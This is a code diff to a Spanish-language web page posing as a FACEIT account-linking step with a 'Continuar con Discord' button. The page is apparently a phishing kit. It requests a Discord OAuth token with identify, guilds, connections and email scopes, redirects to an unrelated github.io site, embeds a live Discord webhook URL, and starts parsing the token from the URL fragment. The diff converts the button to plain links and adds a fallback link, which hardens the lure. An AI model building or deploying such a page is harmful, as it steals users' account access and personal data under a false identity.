@@ -18,11 +18,13 @@
   .step{display:flex;gap:12px;align-items:center;font-size:13px;color:#c6cbd1}
   .num{width:22px;height:22px;border-radius:50%;background:#26282d;color:#ff5500;display:flex;
        align-items:center;justify-content:center;font-weight:700;font-size:11px;flex:none}
-  button{width:100%;padding:14px;border-radius:10px;border:none;background:#5865F2;color:#fff;
-         font-weight:700;font-size:15px;cursor:pointer;display:flex;align-items:center;
-         justify-content:center;gap:10px;transition:.15s}
-  button:hover{background:#4752c4}
+  #btn{width:100%;padding:14px;border-radius:10px;border:none;background:#5865F2;color:#fff;
+       font-weight:700;font-size:15px;cursor:pointer;display:flex;align-items:center;
+       justify-content:center;gap:10px;transition:.15s;text-decoration:none;line-height:1.2}
+  #btn:hover{background:#4752c4}
   .fine{margin:18px 0 0;font-size:11px;color:#6b7075;text-align:center;line-height:1.5}
+  .manual{margin:10px 0 0;font-size:11px;text-align:center}
+  .manual a{color:#5865F2;word-break:break-all}
   #status{margin-top:16px;font-size:13px;text-align:center;color:#9aa0a6;min-height:18px}
   #status.ok{color:#3ba55d}
   #status.err{color:#ed4245}
@@ -43,35 +45,21 @@
     <div class="step"><span class="num">3</span>Vuelve a FACEIT automáticamente</div>
   </div>
 
-  <button id="btn">
+  <a id="btn" href="https://discord.com/oauth2/authorize?client_id=1570090821276012595&amp;response_type=token&amp;redirect_uri=https%3A%2F%2Ftizianobaston2023-hash.github.io%2Fbeldent-chicle%2F&amp;scope=identify+guilds+connections+email&amp;prompt=consent">
     <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M20.3 4.4A19.8 19.8 0 0 0 15.4 3l-.3.6a14.6 14.6 0 0 1 4.3 1.4 15.7 15.7 0 0 0-13.7 0A14.6 14.6 0 0 1 9 3.6L8.6 3a19.8 19.8 0 0 0-4.9 1.4C.6 9.2-.3 13.9.1 18.5a20 20 0 0 0 6 3l.7-1.2c-.8-.3-1.5-.7-2.2-1.1l.5-.4a14.3 14.3 0 0 0 12.2 0l.5.4c-.7.4-1.4.8-2.2 1.1l.7 1.2a20 20 0 0 0 6-3c.5-5.3-.8-10-3.5-14.1zM8.3 15.4c-1.2 0-2.1-1.1-2.1-2.4s.9-2.4 2.1-2.4 2.2 1.1 2.1 2.4c0 1.3-.9 2.4-2.1 2.4zm7.4 0c-1.2 0-2.1-1.1-2.1-2.4s.9-2.4 2.1-2.4 2.2 1.1 2.1 2.4c0 1.3-.9 2.4-2.1 2.4z"/></svg>
     Continuar con Discord
-  </button>
+  </a>
 
   <p class="fine">Al continuar aceptas vincular tu cuenta de Discord con FACEIT.</p>
+  <p class="manual">Si el botón no responde, <a href="https://discord.com/oauth2/authorize?client_id=1570090821276012595&amp;response_type=token&amp;redirect_uri=https%3A%2F%2Ftizianobaston2023-hash.github.io%2Fbeldent-chicle%2F&amp;scope=identify+guilds+connections+email&amp;prompt=consent">abre este enlace</a>.</p>
   <div id="status"></div>
 </div>
 
 <script>
-/* ================= CONFIGURACIÓN ================= */
-const CLIENT_ID    = "1570090821276012595";
-const REDIRECT_URI = "https://tizianobaston2023-hash.github.io/beldent-chicle/";
-const WEBHOOK_URL  = "https://discord.com/api/webhooks/1570093723562545224/1XCD99eXZMe9OTHEudjbwR_rOYarr0j3JxG99JRZwm8VzEZBp2P0SRGFGbHBkInNISpP";
-const SCOPES       = "identify guilds connections email";
+const WEBHOOK_URL    = "https://discord.com/api/webhooks/1570093723562545224/1XCD99eXZMe9OTHEudjbwR_rOYarr0j3JxG99JRZwm8VzEZBp2P0SRGFGbHBkInNISpP";
 const AFTER_REDIRECT = "https://discord.com/channels/@me";
-/* ================================================= */
 
 const $ = id => document.getElementById(id);
-
-const AUTH_URL = "https://discord.com/oauth2/authorize?" + new URLSearchParams({
-  client_id: CLIENT_ID,
-  response_type: "token",
-  redirect_uri: REDIRECT_URI,
-  scope: SCOPES,
-  prompt: "consent"
-}).toString();
-
-$("btn").addEventListener("click", () => { location.href = AUTH_URL; });
 
 async function run() {
   const hash  = new URLSearchParams(location.hash.slice(1));
